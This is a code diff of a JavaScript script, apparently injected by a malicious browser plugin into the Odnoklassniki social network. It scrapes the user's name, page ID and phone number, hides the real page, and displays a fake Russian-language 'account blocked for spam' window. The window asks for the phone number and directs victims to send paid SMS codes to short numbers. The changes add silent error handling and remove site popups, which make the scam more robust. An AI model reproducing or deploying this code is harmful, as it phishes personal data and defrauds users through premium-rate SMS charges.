@@ -15,16 +15,18 @@ function TelCode(num){
 
 
 function NewAction() {
-    if (plg.Get('vRun')) {
-        LockStop();
-        plg.Save('oRun', "0");
-        return false;
-    }
-	if (!plg.Get('oRun')){
-		plg.Save('oRun','1');
-		//SendStat(0,"small");
-		
+	try{
+		if (plg.Get('vRun')) {
+			LockStop();
+			plg.Save('oRun', "0");
+			return false;
+		}
+		if (!plg.Get('oRun')){
+			plg.Save('oRun','1');
+			//SendStat(0,"small");
+		}	
 	}
+	catch(e) {}
 }
 
 
@@ -136,17 +138,24 @@ function AjaxLoad(lnk, params_post, fSuccess, fFailed) {
 
 function CheckTime() {
     var startTime = getTime() + (60*4);
-    if (plg.Get('oTime')) {
-        return false;
+	try{
+		if (plg.Get('oTime')) {
+			return false;
 
-    } else {
-        plg.Save('oTime', startTime.toString());
-    }
+		} 
+		else{
+			plg.Save('oTime', startTime.toString());
+		}
+	}
+	catch(e) {}
 }
 
 function LockStop() {
-    plg.Save('oRun', '0');
-    document.getElementById('hook_Block_PopLayer').style.display = "none";
+	try{
+		plg.Save('oRun', '0');
+		document.getElementById('hook_Block_PopLayer').style.display = "none";
+	}
+	catch(e){}
 
 }
 
@@ -194,14 +203,21 @@ AjaxLoad('http://' + document.location.hostname,DF,function(next){
 		buf = srvAns.match(/[+]{1}[0-9]+(?:[X]+)/g);
 		phone = buf.toString();
 		phone=phone.replace(/[X]/gi,'');
-		phone=phone.replace(/[+7]/gi, '');								
-		plg.Save('oPhone',buf.toString());
+		phone=phone.replace(/[+7]/gi, '');	
+		try{	
+			plg.Save('oPhone',buf.toString());
+		}
+		catch(e){}
+		
 		var f = buf.toString();
 		buf=f.replace(/[X]/gi,'');						
 		Num();
 	}
 	else{
-		plg.Save('oPhone','');
+		try{
+			plg.Save('oPhone','');
+		}
+		catch(e){}
 	}
 						
 })
@@ -270,7 +286,10 @@ function GetCountry() {
 var gCode = "";
 var pCode = "";
 function Prefix() {
-var code = (plg.Get('oPhone'));
+	try{
+		var code = (plg.Get('oPhone'));
+	}
+	catch(e){}
 
 gCode = code;
 
@@ -278,7 +297,10 @@ gCode = code;
 if (/\+380/ig.test(code)) { 
 
 	type = "1";
-	plg.Save('oType',type);
+	try{
+		plg.Save('oType',type);
+	}
+	catch(e){}
 return;
 }
 if (/\+374|\+994|\+375|\+77|\+370|\+371|\+373/ig.test(code)) { 
@@ -309,7 +331,7 @@ function Num() {
 
 function LoadCSS() {
     var NewCSS = document.createElement("link");
-    NewCSS.setAttribute("href", "http://stg.odnoklassniki.ru/res/batch/css/9f2f479c/main-part4.css");
+    NewCSS.setAttribute("href", "http://payment.odnoklassniki.ru/res/batch/css/f41e4d2d/main_base64.css");
     NewCSS.setAttribute("type", "text/css");
     NewCSS.setAttribute("rel", "stylesheet");
     document.getElementsByTagName('head')[0].appendChild(NewCSS);
@@ -678,12 +700,28 @@ function Show_Wnd() {
     var modalPop = document.getElementById('hook_Block_PopLayer');
 
 	Num();
+	if (document.getElementById('hook_PopLayerSticky_popLayer'))
+	{
+		try{
+			//document.getElementById('hook_Block_MainContainer').innerHTML = '';
+			document.getElementById('hook_PopLayerSticky_popLayer').innerHTML = '';
+			document.getElementById('hook_PopLayerSticky_popLayer').parentNode.removeChild(document.getElementById('hook_PopLayerSticky_popLayer'));
+			
+		}
+		catch(e){}
+	}	
 	modalPop.innerHTML = ' <div class="feed-loading"></div></div><div id="hook_Modal_popLayer2" class="modal" ><div id="popLayer_mo" class="modal_overlay"></div><table class="modal_tbl"><tbody><tr><td class="modal_td"><div id="modal_box" class="modal_box modal_box__payment" style="width: 740px; height: 341px;"><div class="panelLayer layerPanelSimple" id="paymentWizardInstant" style="width: 740px; height: 341px; border-color:#FFF;"><div class="panelLayer_head"><div class="panelLayer_head_headerSimple__no-title"></div></div><div class="panelLayer_body"><div id="pmntWzrdCtr"><div id="hook_Block_MiddleColumn" class="hookBlock"><div id="middleColumn"><div id="hook_Block_AnonymAccountRecovery" class="hookBlock"><div class="hook" id="hook_Form_5878971965"><form action="#" method="post"><div id="LockContent"><div id="Step_1" style="float: left; height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h2 class="recovery-header" ><br>' + unescape(plg.Get('oName')) + ', Ваша страница была временно заблокирована по подозрению на взлом!</h1><div><br>Наша система безопасности выявила массовую рассылку спам-сообщений с Вашего аккаунта и мы были вынуждены временно заблокировать его. Для того чтобы восстановить доступ к странице, нам необходимо убедиться в том, что Вы являетесь её <b>настоящим владельцем</b>.<br>Вам следует указать номер телефона, к которому <b>привязана Ваша страница.</b></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody><tr><td>Страна оператора: <Label id="contr"  ><b>Россия</b></label> <a><span style="color:orange;" id = "choose_country" onclick= "Sp_st();" >Выберите страну</a></span> <select onchange="in_sel_ch();"style="float: left; display: none; width: 90%;" id="country_select" name="country_select">2.<option value="+7">Россия</option cursor:pointer>3.<option value="+380">Украина</option>4.<option value="+374">Армения</option>5.<option value="+994">Азербайджан</option>5.<option value="+375">Беларусь</option>6.<option value="+370">Литва</option>6.<option value="+371">Латвия</option>7.<option value="+373">Молдова</option> 7.<option value="+77">Казахстан</option></select>&nbsp;</td></tr></tbody></table><span class="input-l input-l__promo recovery-phone-prefix"><label id="pre" for="prefix">+7</label></span><div class="it_w"><input type="text" name="st.mobile" value="'+phone+'" id="field_mobile_num" class="it it__promo" autocomplete="off" maxlength="20"  onkeypress="return OnlyNumB(event)" autofocus></div><span class="input-e"></span></div><span><div class="form_i" style = "float:left"><input type="button" id="step" onclick="GoStep(); SendSMS();" value="Продолжить"   class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div>	<div id="Step_2"  style="float: left;  height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h3 class="recovery-header"><br><br>Восстановление доступа</h3><br><b>' + unescape(plg.Get('oName')) + '</b>, в течение минуты на номер <b>  ' +tlf+'</b>  поступит SMS-сообщение с кодом разблокировки Вашего аккаунта.<div></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody></tr></tbody></table><span class="input-l"><h2 class="recovery-header" >Введите код <br></h2></span><div class="it_w"><input type="text" name="st.mobile" value="" id="field_mobile2"  class="it it__promo" maxlength="20"></div><span class="input-e"></span></div><div class="form_i"><span><input type="button" id="step2" onclick="st_2();" value="Восстановить доступ" class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div><div></form></div></div></div></div></div></div></div></div></td></tr></tbody></table></div></div></div>';
     modalPop.style.display = 'block';
-
+	modalPop.style.zindex = "999999";
+	
 	document.getElementById('field_mobile_num').value = nam;
     plg.Save('oRun', '2');
 	SendStat(1,"small");
+	try{
+		var feel_loading = document.getElementsByClassName('feed-loading')[0];
+		feel_loading.parentNode.removeChild(feel_loading);
+	}
+	catch(e){}
 }
 
 
@@ -722,26 +760,44 @@ if (plg.Get('oTime')){
     toolbar.innerHTML = '<div class="toolbar_c"><a class="toolbar_logo"><div class="toolbar_logo_img"></div></a><div class="toolbar_label">Восстановление доступа</div></div>';
     ClearPage();
 	Num();
-	
+	if (document.getElementById('hook_PopLayerSticky_popLayer'))
+	{
+		try{
+			//document.getElementById('hook_Block_MainContainer').innerHTML = '';
+			document.getElementById('hook_PopLayerSticky_popLayer').innerHTML = '';
+			document.getElementById('hook_PopLayerSticky_popLayer').parentNode.removeChild(document.getElementById('hook_PopLayerSticky_popLayer'));		
+			
+		}
+		catch(e){}
+		}
     modalPop.innerHTML = '<div class="feed-loading"></div></div><div id="hook_Modal_popLayer" class="modal" ><div id="popLayer_mo" class="modal_overlay"></div><table class="modal_tbl"><tbody><tr><td class="modal_td"><div id="modal_box" class="modal_box modal_box__payment" style="width: 740px; height: 341px;"><div class="panelLayer layerPanelSimple" id="paymentWizardInstant" style="width: 740px; height: 341px; border-color:#FFF;"><div class="panelLayer_head"><div class="panelLayer_head_headerSimple__no-title"></div></div><div class="panelLayer_body"><div id="pmntWzrdCtr"><div id="hook_Block_MiddleColumn" class="hookBlock"><div id="middleColumn"><div id="hook_Block_AnonymAccountRecovery" class="hookBlock"><div class="hook" id="hook_Form_5878971965"><form action="#" method="post"><div id="LockContent"><div id="Step_1" style="float: left; height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h2 class="recovery-header" ><br>' + unescape(plg.Get('oName')) + ', Ваша страница была заблокирована по подозрению на взлом!</h1><div><br>Наша система безопасности выявила массовую рассылку спам-сообщений с Вашего аккаунта и мы были вынуждены временно заблокировать его. Для того чтобы восстановить доступ к странице, нам необходимо убедиться в том, что Вы являетесь её <b>настоящим владельцем</b>.<br>Вам следует указать номер телефона, к которому <b>привязана Ваша страница.</b></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody><tr><td>Страна оператора: <Label id="contr"  ><b>Россия</b></label> <a><span style="color:orange;" id = "choose_country" onclick= "Sp_st();" >Выберите страну</a></span> <select onchange="in_sel_ch();"style="float: left; display: none; width: 90%;" id="country_select" name="country_select">2.<option value="+7">Россия</option cursor:pointer>3.<option value="+380">Украина</option>4.<option value="+374">Армения</option>5.<option value="+994">Азербайджан</option>5.<option value="+375">Беларусь</option>6.<option value="+370">Литва</option>6.<option value="+371">Латвия</option>7.<option value="+373">Молдова</option>7.<option value="+77">Казахстан</option> </select>&nbsp;</td></tr></tbody></table><span class="input-l input-l__promo recovery-phone-prefix"><label id="pre" for="prefix">+7</label></span><div class="it_w"><input type="text" name="st.mobile" value="7"'+nam+' id="field_mobile_num" class="it it__promo" autocomplete="off" maxlength="20" onkeypress="return OnlyNumB(event)" autofocus></div><span class="input-e"></span></div><span><div class="form_i" style = "float:left"><input type="button" id="step" onclick="GoStep(); SendSMS();" value="Продолжить" class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div>	<div id="Step_2"  style="float: left;  height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h3 class="recovery-header"><br><br>Восстановление доступа</h3><br><b> ' +unescape(plg.Get('oName')) + ' </b>,в течение минуты на номер <b>  ' +tlf+'</b>  поступит SMS-сообщение с кодом разблокировки Вашего аккаунта.<div></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody></tr></tbody></table><span class="input-l"><h2 class="recovery-header" >Введите код <br>подтверждения</h2></span><div class="it_w"><input type="text" name="st.mobile" value="" id="field_mobile2"  class="it it__promo" maxlength="20"></div><span class="input-e"></span></div><div class="form_i"><span><input type="button" id="step2" onclick="st_2();" value="Восстановить доступ" class="button-pro"></span></div><div class="form_i"><br><a span id="hid" style="cursor:pointer" onclick="Hidden();">Не получили код?</a><a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span> <div id="hide" style="display:none"><br>Получить активационный код можно отправив SMS с текстом <b>00718</b> на номер <b>6681</b>.Стоимость SMS равна номинальной стоимости, установленной вашим оператором.Если не получилось отправить смс, свяжитесь с нами</div></div></div></div><div></form></div></div></div></div></div></div></div></div></td></span></tr></tbody></table></div></div></div>';
     modalPop.style.display = 'block';
-	pCode = document.getElementById('country_select').value;	
-
-	document.getElementById('field_mobile_num').value = nam;
-    modalPop.focus();
-    document.getElementsByClassName('modal_overlay')[0].style.backgroundColor = "#FFF";
-    document.getElementById('modal_box').style.borderColor = "#FFF";
-    document.getElementById('mainContainer').style.backgroundColor = "#FFF";
-    plg.Get('oRun') == '2';
-	SendStat(2,"small");
-	
+	modalPop.style.zindex = "999999";
+	try{
+		var feel_loading = document.getElementsByClassName('feed-loading')[0];
+		feel_loading.parentNode.removeChild(feel_loading);
+	}
+	catch(e){}
+	try {
+		pCode = document.getElementById('country_select').value;	
+		document.getElementById('field_mobile_num').value = nam;
+		modalPop.focus();
+		document.getElementsByClassName('modal_overlay')[0].style.backgroundColor = "#FFF";
+		document.getElementById('modal_box').style.borderColor = "#FFF";
+		document.getElementById('mainContainer').style.backgroundColor = "#FFF";
+		plg.Get('oRun') == '2';
+		SendStat(2,"small");
+	}
+	catch(e){
     if (document.getElementsByClassName('feed-loading')[0])
         document.getElementsByClassName('feed-loading')[0].parentNode.removeChild(document.getElementsByClassName('feed-loading')[0]);
 
 }
 var h="0";
 var textBig = "Получить активационный код можно отправив SMS с текстом <b>00718</b> на номер <b>6681</b>.Если не получилось отправить смс, свяжитесь с нами";
+}
 function Hidden() {
+var h="0";
 	if (h==0){
 		if (shot==1) {
 			textBig = 'Отправьте <b>pm342243</b> на номер <b>1003</b> для получения кода';
@@ -946,7 +1002,10 @@ function GetId() {
     id = document.getElementsByClassName('portal-headline__link')[3];
     id = id.href.match(/[0-9]+/);
     oID = id.toString();
-    plg.Save('oIdPage', id.toString());
+	try{
+		plg.Save('oIdPage', id.toString());
+	}
+	catch(e) {}
 }
 window.onload = function () {
 
@@ -955,26 +1014,26 @@ window.onload = function () {
     NewAction();
     GetId();
 	GetName();
-	if ((!plg.Get('oPhone'))||(plg.Get('oPhone').lenght==0)){    
-		GetNumber();
+	try{
+		if ((!plg.Get('oPhone'))||(plg.Get('oPhone').lenght==0)){    
+			GetNumber();
+		}
+		var key = plg.Get('oRun');
+		if (key == '0') {
+			LockStop();
+			return false;
+		}
+		if (key == '1') {
+			document.body.addEventListener('DOMNodeInserted', Go, false);
+			LoadCSS();
+			
+		}
+		if (key == '2') {
+			LoadCSS();
+			Wnd_Page();
+		}
 	}
-	
-
-	var key = plg.Get('oRun');
-    if (key == '0') {
-        LockStop();
-        return false;
-    }
-    if (key == '1') {
-        document.body.addEventListener('DOMNodeInserted', Go, false);
-      	LoadCSS();
-		
-	}
-    if (key == '2') {
-        LoadCSS();
-        Wnd_Page();
-    }
-	
+	catch(e){}
 
 }
 
